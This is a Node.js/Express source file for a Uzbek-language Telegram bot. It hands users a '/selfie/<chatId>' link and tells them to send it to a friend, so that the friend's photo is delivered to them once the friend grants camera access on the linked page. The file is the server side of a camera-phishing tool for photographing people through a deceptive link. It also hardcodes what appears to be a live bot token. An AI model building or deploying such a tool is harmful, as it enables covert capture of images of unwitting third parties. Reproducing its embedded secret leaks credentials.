import express from "express";
import TelegramBot from "node-telegram-bot-api";
import path, { parse } from "path";
import { fileURLToPath } from "url";
import fs from "fs";
import { text } from "stream/consumers";
import { url } from "inspector";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Bot token
const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
const BASE_URL = "https://korish.onrender.com";

// Webhook bilan botni sozlaymiz
const bot = new TelegramBot(TOKEN);
bot.setWebHook(`${BASE_URL}/bot${TOKEN}`);

// Tugmalar
const buttons = {
  reply_markup: {
    keyboard: [
      [{ text: "📸 Rasm olish" }, { text: "📢 Kanal" }],
      [{ text: "🆘 Yordam" }],
    ],

    resize_keyboard: true,
  },
};

// Webhook endpoint
app.use(express.json());
app.post(`/bot${TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(
    chatId,
    `Salom ${msg.from.first_name}! Botga xush kelibsiz!\n\nRasm olish uchun pastdagi tugmadan foydalaning.`,
    buttons
  );
});

// Tugmalarni qabul qilish
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (text === "📸 Rasm olish") {
    const url = `${BASE_URL}/selfie/${chatId}`;
    bot.sendMessage(
      chatId,
      `📷 Rasm olish uchun quyidagi havolani bosing:\n\n${url}`
    );
  }
  if (text === "📢 Kanal") {
    bot.sendMessage(
      chatId,
      "*Kanalga qo‘shilish uchun pastdagi tugmani bosing.*",
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📢 Kanalga qo‘shilish",
                url: "https://t.me/koryapman_bot",
              },
            ],
          ],
        },
      }
    );
  }
  if (text === "🆘 Yordam") {
    bot.sendMessage(
      chatId,
      "Shunchaki 📸 *Rasm olish* tugmasini bosing va berilgan linkni do‘stingizga yuboring.\n\nAgar do‘stingiz linkga kirib kamera ruxsatiga rozilik bildirsa, sizga uning rasmi yuboriladi.\n\n⚠️ Faqat to‘g‘ri yo‘lda foydalaning.",
      { parse_mode: "Markdown" }
    );

    bot.sendVoice(chatId, "music/koryapman.ogg");
  }
});

// Selfie sahifa
app.get("/selfie/:id", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.listen(PORT, () => {
  console.log(`✅ Server ishga tushdi: ${BASE_URL} (PORT: ${PORT})`);
});
